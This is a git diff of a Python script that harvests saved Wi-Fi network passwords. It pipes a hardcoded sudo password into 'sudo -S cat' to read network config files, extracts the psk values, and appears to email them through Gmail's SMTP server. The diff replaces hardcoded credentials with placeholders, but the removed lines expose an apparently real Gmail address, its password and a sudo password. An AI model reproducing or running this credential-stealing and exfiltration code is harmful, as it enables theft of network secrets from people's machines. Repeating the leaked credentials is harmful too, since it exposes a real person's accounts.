@@ -14,8 +14,8 @@ import smtplib    # The smtplib module defines an SMTP client session object tha
 # Actual usage varies depending on complexity of the email and settings of the
 # email server, the instructions here are based on sending email through Gmail.
 
-mail_id = "royraven256@gmail.com"
-mail_password = "ravisingh@1234"
+mail_id = "XXXXXXXXXXXXXXXXX"
+mail_password = "XXXXXXXXXXX"
 
 server = smtplib.SMTP('smtp.gmail.com', 587)
 server.ehlo()
@@ -55,7 +55,7 @@ networklist = All_network#.decode().split('\n')[0:-1]
 #print(networklist)            # saving SSID in a list
 id_pass = {}                                            # Empty dictionary used to store SSId and Pass
 for network in networklist:                             # Looping Over every network  
-	cm_to_bypass_sudo = subprocess.Popen(['echo',"asdfzxcv"], stdout=subprocess.PIPE) # Bypassing Sudo
+	cm_to_bypass_sudo = subprocess.Popen(['echo',"XXXXXXXXXXXX"], stdout=subprocess.PIPE) # Bypassing Sudo
 	password_string   = subprocess.Popen(['sudo','-S',"cat"] + [network], stdin=cm_to_bypass_sudo.stdout, stdout=subprocess.PIPE) # opening the file which saves the password and other details.
 	result = grab_password(password_string.stdout.read().decode() ,"psk\npsk",1,"\n") #Grabing Password
 	id_pass[network] = result                           #storing them in dictionary
